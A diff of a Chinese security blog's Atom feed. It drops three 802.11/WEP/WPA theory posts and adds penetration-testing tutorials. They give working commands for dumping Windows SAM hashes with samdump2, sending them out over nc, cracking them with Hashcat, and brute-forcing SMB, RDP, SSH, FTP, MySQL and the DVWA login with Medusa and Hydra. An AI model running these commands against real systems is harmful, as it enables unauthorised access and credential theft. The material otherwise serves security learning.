@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://c.cat.plus/"/>
-  <updated>2020-04-04T15:01:51.276Z</updated>
+  <updated>2020-05-14T15:12:54.169Z</updated>
   <id>http://c.cat.plus/</id>
   
   <author>
@@ -15,72 +15,6 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>Wireless_Attacks/无线技术理论/RADIOTAP头部</title>
-    <link href="http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/RADIOTAP%E5%A4%B4%E9%83%A8/"/>
-    <id>http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/RADIOTAP%E5%A4%B4%E9%83%A8/</id>
-    <published>2020-05-18T05:59:28.907Z</published>
-    <updated>2020-04-04T15:01:51.276Z</updated>
-    
-    <content type="html"><![CDATA[<p>Radiotap Head<br>802.11侦发射和接收的事实标准,802.11依赖Radiotap完成通信过程<br>Linux系统在驱动和API中内建支持Radiotap<br>802.11帧发射之前,网卡驱动在802.11头前面添加Radiotap头,反之当网卡接收到无线帧时,驱动通知MAC层,此帧头包含Radiotap头<br>Radiotap为802.11帧传递额外信息,厂家可自定义,因此头长度不固定<br>不破坏原始头结构,增加传递的信息</p><p>分为Header和data<br>Version(8bit)<br>    值始终为0<br>Pad(8bit)<br>    未使用,只作为字段强制对其占位；<br>Length(16bit)<br>    整个radiotap头长度(可变),作用是确定802.11头的开始位置<br>Present(32bit)<br>    Data段的掩码<br>    Ext(1,0)<br>    MAC不能理解的头部直接忽略</p><p>802.11头部信息<br>    DU(Data Unit)即数据单元,信息传输的最小数据集合<br>    传递过程逐层封装(Encapsulation)<br>    SDU(Service Data Unit) /PDU(Protocol Data Unit)<br>    MSDU–&gt;MIC–&gt;分帧–&gt;添加IV–&gt;加密–&gt;添加MAC头部–&gt;MPDU<br>    MPDU/PSDU+物理头=PPDU–&gt;RF发射<br>802.11 MAC头结构<br>Frame Control<br>    Protocol Version(2bit)    :802.11协议版本,始终为0,1,2,3<br>    Type(2bit)    :规定帧的具体用途(3种帧类型)<br>        控制帧(1)<br>        数据帧(2)<br>        管理帧(0)<br>    SubType(4bit)<br>        每个类型对应多个子类型,协议规定不同类型/子类型的帧完成不同功能的操作<br>    To DS/From (1/1bit)<br>        标识帧的传输方向,传向DS或者来自DS；这两个字段的值决定着MAC头中4个Adddress字段的不同定义.<br>    0x00:出现在IBSS环境中(可能是Management帧或者是Control帧类型)；或者是STSL(Stantion to Station Link)中两个STA间通信,这种情况下通信不通过AP；<br>    0x01:表示Data帧从AP向STA传递;<br>    0x02:表示Data帧从Sta向AP传递;<br>    0x03:表示两个AP间通信,这是典型的WDS(Wireless Distribution System)环境下AP间的通信,或者表示Mesh环境下MP间的通信；只有此时才会使用到Address4字段；    </p><pre><code>More frag(1bit):表示是否还有后续帧    值为1时表示有后续分段,可能是Data或Management帧类型.只有单播接收地址的帧会被分段；Retry(1bit):重传    值为1表示重传帧,可能是Data或Management帧类型,接收端进程使用此值防止帧重复；Power Mgmt(1bit):活动模式(0)/省电模式(1)    STA处于省电模式时,向关联的AP发送该值为1的帧(AP从不使用此字段),省电模式下STA不接收数据,发送给它的Data帧由AP暂时缓存；More Data(1bit)    当AP缓存了至少一个MSDU时,会向省电模式的STA发送该值为1的帧,表示有数据要传输给STA,接收到此帧的STA唤醒自己并向AP发送PS-Poll帧,    取回由AP为其缓存的数据.也被用于AP有更多的广播/多播帧需要发送的情况；Protected Frame(1bit)    可能是Data或Management帧类型,表示MSDU是否被加密；也被用于表示PSK身份验证Frame#3帧;数据载荷为空时,该字段值为0；Order(1bit)    在非QoS帧的情况下,值为1表示数据必须按严格顺序处理,通常为0；</code></pre><p>Duration/ID(16bit)<br>    所有Control帧都使用该字段,其作用随Type/SubType变化有所不同；<br>    帧类型为PS Poll(type:1,subtype:10)时,表示STA关联的AIP(association identity);<br>    其他情况下该字段作为一种载波侦听机制,表示接收下一帧之前需要保持的时间间隔,用于NAV(Network Allocation Vector)计算,单位是微秒；<br>MAC Layer Address<br>    前面已经提到了4种,这里补充最后一种:Basic service set ID(BSSID); 它是BSS的2层唯一标识,Infrastructure模式中BSSID就是AP的MAC地址,当AP支持多BSS时,随机生成每个BSSID；<br>Sequence Control(16bit)<br>    这个字段包含两个子字段:Sequence Number和Fragment Number;<br>    Sequence Number是每个帧的编号,数值范围是0–4095,以1为步长递增.当帧被分段时,同一帧中不同分段的Sequence Number相同；<br>    Fragment Number是被分段的帧用于标识分段位置顺序的编号,数值范围是0–15,以1为步长递增；</p><p>DATA部分<br>Frame Body(变长)<br>    数据字段,未加密的最大MSDU长度为2304字节(其中包含最大256字节的上层头信息,和可被传递的数据2048字节).<br>    不同的加密方法会增加一定的内容长度；<br>    WEP:8 bytes–&gt;2312bytes<br>    TKIP(WPA1):20bytes–&gt;2324bytes<br>    CCMP(WPA2):16bytes–&gt;2320bytes<br>    注:Control类型的帧没有Frame Body内容.</p><p>FCS(32bit)<br>    发送端对全部MAC包头和Frame Body内容进行CRC计算,计算结果即为FCS(Frame Check Sequence)值,接收端进行同样的计算,结果一致时,<br>    则接收端向发送端返回ACK,否则丢弃帧(只对单播帧有效,FCS错误的广播/多播帧可能被接收)<br>    注:wireshark抓包时已经删除了FCS值</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;Radiotap Head&lt;br&gt;802.11侦发射和接收的事实标准,802.11依赖Radiotap完成通信过程&lt;br&gt;Linux系统在驱动和API中内建支持Radiotap&lt;br&gt;802.11帧发射之前,网卡驱动在802.11头前面添加Radiotap头,反之当网卡接收
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Wireless_Attacks/无线技术理论/WEP加密-RC4算法</title>
-    <link href="http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WEP%E5%8A%A0%E5%AF%86-RC4%E7%AE%97%E6%B3%95/"/>
-    <id>http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WEP%E5%8A%A0%E5%AF%86-RC4%E7%AE%97%E6%B3%95/</id>
-    <published>2020-05-18T05:59:28.907Z</published>
-    <updated>2020-04-06T04:24:53.524Z</updated>
-    
-    <content type="html"><![CDATA[<p>加密<br>    无线安全根源<br>        802.11基于无线电波发射信息<br>        嗅探侦听是主要问题<br>        加密机制是必须手段<br>    Wired Equivalent Privacy(WEP)<br>        802.11标准的一部分<br>        发布后不久被发现存在安全漏洞<br>    Wi-Fi Protected Access(WPA)取代WEP<br>        WPA2(802.11i 标准)</p><p>OPEN无加密网络<br>    无任何加密机制<br>    所有数据都可以被嗅探<br>    STA和AP只协商拼配参数即可连入网络        </p><p>WEP加密<br>    使用Rivest Cipher 4(RC4)算法加密流量内容,实现机密性<br>    CRC32算法检查数据完整性<br>    标准采用使用24位initialization vector(IV)<br>    受美国加密技术出口限制法律的要求<br>        高于64bit key禁止出口<br>        所以除24bit IV之外真实的key只有40bit的版本被允许出口<br>        出口限制法律撤销后实现了128bit key的WEP版本(使用相同的24bit IV)<br>RC4算法<br>    RSA实验室研发的对称加密流算法<br>        实现简单<br>        速度快<br>    加密:对明文流和密钥流进行XOR计算(XOR:二进制异或运算)<br>    解密:对密文流和密钥流进行XOR计算<br>    RC4算法key由两个过程生成<br>        合并IV和PSK,利用Key Scheduling Algorithm(KSA)算法生成起始状态表<br>        Pseudo-Random Generation Algorithm(PRGA)算法生成最终密钥流<br>RC4算法加密流程<br>RC4算法解密流程</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;加密&lt;br&gt;    无线安全根源&lt;br&gt;        802.11基于无线电波发射信息&lt;br&gt;        嗅探侦听是主要问题&lt;br&gt;        加密机制是必须手段&lt;br&gt;    Wired Equivalent Privacy(WEP)&lt;br&gt;        80
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Wireless_Attacks/无线技术理论/WPA安全系统</title>
-    <link href="http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WPA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/"/>
-    <id>http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WPA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/</id>
-    <published>2020-05-18T05:59:28.907Z</published>
-    <updated>2020-04-06T07:27:20.089Z</updated>
-    
-    <content type="html"><![CDATA[<p>WPA安全系统<br>    Wi-Fi Protected Access<br>    802.11i 组为提高无线安全,开发两个新的链路层加密协议<br>        Temporal Key Integrity Protocol(TKIP)<br>            WPA1(较之WEP可动态改变密钥)<br>        Counter Mode with CBC-MAC(CCMP)<br>            WPA2<br>    WPA加密两种安全类型<br>        WPA个人:使用预设共享密钥实现身份验证<br>        WPA企业:使用802.1X和Radius服务器实现AAA(认证协议框架EAP)</p><p>WPA1<br>    802.11i 第三版草案<br>    与WEP比较<br>        都采用逐包进行密钥加密<br>        128位的key和48位的初向量(IV)<br>        RC4流加密数据<br>        帧计数器避免重放攻击<br>        TKIP使用Michael算法进行完整性校验(MIC)<br>            WEP 使用CRC32进行MIC<br>        兼容早期版本硬件</p><p>WPA2<br>    依据802.11i 完全重新设计实现<br>        也被称为Robust Security Network(RSN)<br>        CCMP替代TKIP<br>        AES加密算法取代了RC4<br>        不兼容早期版本硬件</p><p>WPA企业连接过程<br>    协商安全协议<br>    身份认证<br>    密钥分发和验证<br>    数据加密完整性</p><p>WPA-PSK<br>    协商安全协议<br>    密钥分发和验证<br>    数据加密完整性</p><p>协商安全协议<br>    协商认证方式<br>        PSK / 802.1X<br>    单播和组播/广播流量加密套件<br>        TKIP / CCMP<br>    STA通过probe获取无线网络信息<br>        速率<br>        加密<br>        通道<br>        名称</p><p>身份认证(WPA企业)<br>    身份认证基于Extensible Authentication Protocol(EAP)实现<br>        EAP-TLS,需要客户端和服务器证书<br>        EAP-TTLS<br>        PEAP混合身份验证,只需要服务器证书<br>    客户端选择身份认证方式<br>    AP发送身份验证信息给Radius Server,<br>    Radius Server返回”Radius Accept”报时认证成功<br>        其中包含Master Key(MK)<br>    AP通过EAP消息通知STA认证成功</p><p>密钥交换<br>    无线网络设计用于一组无线设备通信<br>        关联到同一AP的设备共享无线信道<br>        单播,广播,组播<br>            安全特性要求不同<br>            单播通信需要单独密钥加密通信双方流量<br>            pairwise key:对偶临时密钥(PIK)<br>            组播通信需要信任域内所有成员共享的同一密钥<br>            group key:组临时密钥(GTK)</p><p>PMK<br>    安全上下文的顶级密钥<br>        MK进行TLS-PRF加密得出PMK<br>    基于服务密钥<br>        由上层身份验证方法服务器生成<br>        从服务器通过 radius传给AP<br>        从AP通过EAP消息传给所有STA<br>    基于PSK共享密钥<br>        Essid+PSK+迭代次数4096—-Hash计算生成<br>        STA和AP分别计算得出PMK,并不在网络中传递交换<br>    256位即32字节</p><p>PTK的生成过程<br>    HMAC-SHA1散列算法<br>    PRF-X散列算法<br>四步握手过程生成PTK<br>    AP发送Anonce给STA<br>    STA生成Snonce计算出PTK<br>    Snonce加PTK的MIC发给AP<br>    AP拿到Snonce计算出PTK<br>    AP计算MIC与接收的MIC比对<br>    MIC一致说明确定STA知道PMK<br>    AP发GTK给STA<br>    STA回复ACK并使用密钥加密</p><p>数据加密和完整性<br>    三种算法<br>        Temporal Key Integrity Protocol(TKIP)4<br>        Counter Mode with CBC-MAC(CCMP)5<br>        Wireless Robust Authenticated Protocol(WRAP)6</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;WPA安全系统&lt;br&gt;    Wi-Fi Protected Access&lt;br&gt;    802.11i 组为提高无线安全,开发两个新的链路层加密协议&lt;br&gt;        Temporal Key Integrity Protocol(TKIP)&lt;br&gt;         
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
   
   <entry>
     <title>Python花式导包的几种方法</title>
@@ -111,11 +45,90 @@
   </entry>
   
   <entry>
+    <title>Hash识别及Hashcat离线密码破解</title>
+    <link href="http://c.cat.plus/2015/05/23/Password_Attacks/Hashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
+    <id>http://c.cat.plus/2015/05/23/Password_Attacks/Hashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
+    <published>2015-05-23T12:35:53.000Z</published>
+    <updated>2020-05-23T09:29:02.839Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><h3 id="离线密码破解"><a href="#离线密码破解" class="headerlink" title="离线密码破解"></a>离线密码破解</h3></blockquote><h4 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h4><ul><li>禁止明文传输密码</li><li>每次认证使用HASH算法加密密码传输(HASH算法加密容易、解密困难)</li><li>服务器端用户数据库应加盐加密保存</li></ul><h4 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h4><ul><li>嗅探获取密码HASH</li><li>利用漏洞登陆服务器并从用户数据库获取密码HASH</li><li>识别HASH类型<br>  长度、字符集</li><li>利用离线破解工具碰撞密码HASH</li></ul><h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><ul><li>离线不会触发密码锁定机制</li><li>不会产生大量登陆失败日志引起管理员注意</li></ul><blockquote><h4 id="HASH识别工具"><a href="#HASH识别工具" class="headerlink" title="HASH识别工具"></a>HASH识别工具</h4></blockquote><ul><li><code>hash‐identifier</code></li><li><code>Hashid</code></li><li>可能识别错误或无法识别</li></ul><blockquote><h4 id="Windows-HASH获取工具"><a href="#Windows-HASH获取工具" class="headerlink" title="Windows HASH获取工具"></a>Windows HASH获取工具</h4></blockquote><ul><li>利用漏洞：<code>Pwdump</code>,<code>fgdump</code>,<code>mimikatz</code>,<code>wce</code> </li><li>物理接触：<code>samdump2</code></li><li>Kali ISO 启动虚拟机 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fdesk -l</span><br><span class="line">mount &#x2F;dev&#x2F;sda1 &#x2F;mnt</span><br><span class="line">cd &#x2F;mnt&#x2F;Windows&#x2F;System32&#x2F;config</span><br><span class="line">samdump2 SYSTEM SAM -o sam.hash</span><br></pre></td></tr></table></figure></li><li>利用nc传输HASH<pre><code>nc -nvlp 333nc 192.168.190.128 333</code></pre><h4 id="Windows系统syskey加密工具"><a href="#Windows系统syskey加密工具" class="headerlink" title="Windows系统syskey加密工具"></a><strong>Windows系统syskey加密工具</strong></h4></li><li>cmd:<code>syskey</code></li><li>使用Bootkey利用RC4算法加密SAM数据库</li><li>Bootkey保存于SYSTEM文件中</li></ul><p><strong>Bkhive</strong></p><ul><li><p>从SYSTEM文件中提取bootkey </p></li><li><p>Kali 2.0 抛弃了bkhive </p><p>  apt-get purge samdump2    #卸载samdump2<br>  编译安装:<code>http://http.us.debian.org/debian/pool/main/b/bkhive/</code><br>  make<br>  make install<br>  bkhive SYSTEM key<br>  samdump2 SAM key  (版本已更新，不再支持此功能)<br>  建议使用 Kali 1.x</p></li></ul><blockquote><h4 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a><strong>Hashcat</strong></h4></blockquote><p>开源多线程密码破解工具<br>支持80多种加密算法破解<br>基于CPU的计算能力破解<br>六种模式 </p><ol start="0"><li>Straight：字典破解</li><li>Combination：将字典中密码进行组合(1 2 &gt; 11 22 12 21)</li><li>Toggle case：尝试字典中所有密码的大小写字母组合</li><li>Brute force：指定字符集(或全部字符集)所有组合</li><li>Permutation：字典中密码的全部字符置换组合(12 21)</li><li>Table-lookup：程序为字典中所有密码自动生成掩码</li></ol><p><strong>命令</strong></p><pre><code>hashcat -bhashcat -m 100 hash.dump pass.lsthashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l?d?d结果：hashcat.pothashcat -m 100 -a 3 hash -i --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l?l = abcdefghijklmnopqrstuvwxyz?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ?d = 0123456789?s =  !&quot;#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\]^_`{|}~?a = ?l?u?d?s?b = 0x00 - 0xff</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;blockquote&gt;
+&lt;h3 id=&quot;离线密码破解&quot;&gt;&lt;a href=&quot;#离线密码破解&quot; class=&quot;headerlink&quot; title=&quot;离线密码破解&quot;&gt;&lt;/a&gt;离线密码破解&lt;/h3&gt;&lt;/blockquote&gt;
+&lt;h4 id=&quot;身份认证&quot;&gt;&lt;a href=&quot;#身份认证&quot; 
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="密码破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
+    
+    
+      <category term="hashid" scheme="http://c.cat.plus/tags/hashid/"/>
+    
+      <category term="hash‐identifier" scheme="http://c.cat.plus/tags/hash%E2%80%90identifier/"/>
+    
+      <category term="mimikatz" scheme="http://c.cat.plus/tags/mimikatz/"/>
+    
+      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
+    
+      <category term="kali" scheme="http://c.cat.plus/tags/kali/"/>
+    
+      <category term="hashcat" scheme="http://c.cat.plus/tags/hashcat/"/>
+    
+      <category term="离线密码破解" scheme="http://c.cat.plus/tags/%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Medusa在线密码破解</title>
+    <link href="http://c.cat.plus/2015/05/23/Password_Attacks/medusa%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
+    <id>http://c.cat.plus/2015/05/23/Password_Attacks/medusa%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
+    <published>2015-05-22T22:05:13.000Z</published>
+    <updated>2020-05-22T08:26:40.249Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>Hydra 的缺点</p></blockquote><ul><li>稳定性差，程序时常崩溃</li><li>速度控制不好，容易触发服务屏蔽或锁死机制</li><li>每主机新建进程，每服务新建实例</li><li>大量目标破解时性能差</li></ul><blockquote><p>Medusa 的特点</p></blockquote><ul><li>稳定性好</li><li>速度控制得当</li><li>基于线程</li><li>支持模块少于hydra(不支持RDP)</li><li>WEB-Form支持存在缺陷</li></ul><h4 id="medusa支持破解的模块"><a href="#medusa支持破解的模块" class="headerlink" title="medusa支持破解的模块"></a><strong>medusa支持破解的模块</strong></h4><pre><code>medusa -d </code></pre><h4 id="medusa破解windows密码"><a href="#medusa破解windows密码" class="headerlink" title="medusa破解windows密码"></a><strong>medusa破解windows密码</strong></h4><pre><code>medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F</code></pre><h4 id="medusa破解Linux-SSH密码"><a href="#medusa破解Linux-SSH密码" class="headerlink" title="medusa破解Linux SSH密码"></a><strong>medusa破解Linux SSH密码</strong></h4><pre><code>medusa -M ssh -h 192.168.20.10 -u root -P pass.lst -e ns –F</code></pre><h4 id="其他服务密码破解"><a href="#其他服务密码破解" class="headerlink" title="其他服务密码破解"></a><strong>其他服务密码破解</strong></h4><pre><code>medusa -M ftp -h 1.1.1.1 -e ns -F -u ftp -P password.lstmedusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -Fmedusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m FORM:&quot;dvwa/login.php&quot; -m DENY-SIGNAL:&quot;login.php&quot; -m FORMDATA:&quot;post?user=username&amp;pass=password&amp;Login=Login&quot;-n：非默认端口-s：使用SSL连接-T：并发主机数 medusa -M ftp -q</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;blockquote&gt;
+&lt;p&gt;Hydra 的缺点&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;稳定性差，程序时常崩溃&lt;/li&gt;
+&lt;li&gt;速度控制不好，容易触发服务屏蔽或锁死机制&lt;/li&gt;
+&lt;li&gt;每主机新建进程，每服务新建实例&lt;/li&gt;
+&lt;li&gt;大量目标破解时性能差&lt;
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="密码破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
+    
+    
+      <category term="medusa" scheme="http://c.cat.plus/tags/medusa/"/>
+    
+      <category term="在线密码破解" scheme="http://c.cat.plus/tags/%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
+    
+  </entry>
+  
+  <entry>
     <title>hydra在线密码破解</title>
     <link href="http://c.cat.plus/2015/05/23/Password_Attacks/hydra%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
     <id>http://c.cat.plus/2015/05/23/Password_Attacks/hydra%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
     <published>2015-05-22T19:15:23.000Z</published>
-    <updated>2020-05-22T06:16:18.713Z</updated>
+    <updated>2020-05-22T08:21:48.845Z</updated>
     
     <content type="html"><![CDATA[<blockquote><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a><strong>Hydra</strong></h3></blockquote><ul><li>九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀</li></ul><h4 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a><strong>Windows密码破解</strong></h4><pre><code>hydra -l administrator -P pass.lst smb://1.1.1.1/admin$ -vVdhydra -l administrator -P pass.lst rdp://1.1.1.1 -t 1 -vV</code></pre><h4 id="Linux密码破解"><a href="#Linux密码破解" class="headerlink" title="Linux密码破解"></a><strong>Linux密码破解</strong></h4><pre><code>hydra -l root -P pass.lst ssh://1.1.1.1 -t 1 -vV</code></pre><h4 id="其他服务密码破解"><a href="#其他服务密码破解" class="headerlink" title="其他服务密码破解"></a><strong>其他服务密码破解</strong></h4><pre><code>hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt -t 64</code></pre><h4 id="hydra图形化界面"><a href="#hydra图形化界面" class="headerlink" title="hydra图形化界面"></a><strong>hydra图形化界面</strong></h4><pre><code>xhydra</code></pre><h4 id="HTTP表单身份认证"><a href="#HTTP表单身份认证" class="headerlink" title="HTTP表单身份认证"></a><strong>HTTP表单身份认证</strong></h4><pre><code>hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:S=index.php&quot; -Vhydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:Login Failed&quot; -V    #失败/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H =X-Foo:FooC:先访问指定页面取得cookieH:指定http头https-post-form、http-get-form、https-get-form-S：使用SSL连接</code></pre><h4 id="pw-inspector-hydra软件包附带工具"><a href="#pw-inspector-hydra软件包附带工具" class="headerlink" title="pw-inspector hydra软件包附带工具"></a><strong>pw-inspector</strong> hydra软件包附带工具</h4><p>按长度和字符集筛选字典</p><pre><code>pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l pw-inspector -i /usr/share/wordlists/nmap.lst -o P.lst -u</code></pre><h4 id="密码破解效率"><a href="#密码破解效率" class="headerlink" title="密码破解效率"></a><strong>密码破解效率</strong></h4><ul><li>密码复杂度(字典命中率)</li><li>带宽、协议、服务器性能、客户端性能</li><li>锁定阈值</li><li>单位时间最大登陆请求次数</li></ul>]]></content>
     
@@ -137,9 +150,9 @@
       <category term="密码破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
     
     
-      <category term="hydra" scheme="http://c.cat.plus/tags/hydra/"/>
+      <category term="在线密码破解" scheme="http://c.cat.plus/tags/%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
     
-      <category term="密码破解" scheme="http://c.cat.plus/tags/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
+      <category term="hydra" scheme="http://c.cat.plus/tags/hydra/"/>
     
   </entry>
   
@@ -148,7 +161,7 @@
     <link href="http://c.cat.plus/2015/05/21/Password_Attacks/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E5%8F%8ACrunch%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/"/>
     <id>http://c.cat.plus/2015/05/21/Password_Attacks/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E5%8F%8ACrunch%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</id>
     <published>2015-05-21T09:05:17.000Z</published>
-    <updated>2020-05-22T02:55:36.325Z</updated>
+    <updated>2020-05-22T08:28:09.989Z</updated>
     
     <content type="html"><![CDATA[<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a><strong>思路</strong></h3><p>目标系统实施了强安全措施</p><ul><li>安装了所有补丁 </li><li>无任何已知漏洞 </li><li>无应用层漏洞 </li><li>攻击面最小化<h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a><strong>社会工程学</strong></h4>获取目标系统用户身份 </li><li>非授权用户不受信，认证用户可以访问守信资源 </li><li>已有用户账号权限受限，需要提权 </li><li>不会触发系统报警</li></ul><h4 id="身份认证方法"><a href="#身份认证方法" class="headerlink" title="身份认证方法"></a><strong>身份认证方法</strong></h4><ul><li>证明你是你声称你是的那个人</li><li>你知道什么（账号密码、pin、passphrase） </li><li>你有什么（令牌、token、key、证书、密宝、手机）</li><li>你是谁（指纹、视网膜、虹膜、掌纹、声纹、面部识别） </li><li>以上方法结合使用（多因素身份认证）<br>基于互联网的身份验证仍以账号密码为主要形式</li></ul><blockquote><h3 id="密码破解方法"><a href="#密码破解方法" class="headerlink" title="密码破解方法"></a><strong>密码破解方法</strong></h3></blockquote><h4 id="人工猜解"><a href="#人工猜解" class="headerlink" title="人工猜解"></a><strong>人工猜解</strong></h4><ul><li>垃圾桶工程</li><li>被动信息收集 <h4 id="基于字典暴力破解（主流）"><a href="#基于字典暴力破解（主流）" class="headerlink" title="基于字典暴力破解（主流）"></a>基于字典暴力破解（主流）</h4><h4 id="键盘空间字符暴破"><a href="#键盘空间字符暴破" class="headerlink" title="键盘空间字符暴破"></a>键盘空间字符暴破</h4></li></ul><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><ul><li>保存有用户名和密码的文本文件 </li><li>/usr/share/wordlist </li><li>/usr/share/wfuzz/wordlist </li><li>/usr/share/seclists</li></ul><blockquote><h3 id="字典-1"><a href="#字典-1" class="headerlink" title="字典"></a><strong>字典</strong></h3></blockquote><h4 id="键盘空间字符爆破"><a href="#键盘空间字符爆破" class="headerlink" title="键盘空间字符爆破"></a>键盘空间字符爆破</h4><ul><li>全键盘空间字符</li><li>部分键盘空间字符 (基于规则)</li><li>数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</li></ul><h4 id="crunch-创建字典"><a href="#crunch-创建字典" class="headerlink" title="crunch 创建字典"></a><strong>crunch 创建字典</strong></h4><pre><code>crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]&lt;charset string&gt; 默认是小写字符crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100-b 按大小分割字典文件(kb/kib、mb/mib、gb/gib)-c 每个字典的行数以上两个参数必须与-o START 结合使用-d 同一字符连贯出现数量(11 / aaa)</code></pre><h4 id="使用字符集"><a href="#使用字符集" class="headerlink" title="使用字符集"></a><strong>使用字符集</strong></h4><p><code>crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt</code></p><h4 id="无重复字符"><a href="#无重复字符" class="headerlink" title="无重复字符"></a><strong>无重复字符</strong></h4><p><code>crunch 1 1 -p 1234567890 | more</code><br>    必须是最后一个参数<br>    最大、最小字符长度失效，但必须存在<br>    与-s 参数不兼容（-s 指定起始字符串）<br><code>crunch 4 4 0123456789 -s 9990</code></p><ul><li>读取文件中每行内容作为基本字符生成字典<br><code>crunch 1 1 -q read</code></li></ul><h4 id="字典组成规则"><a href="#字典组成规则" class="headerlink" title="字典组成规则"></a><strong>字典组成规则</strong></h4><pre><code>crunch 6 6 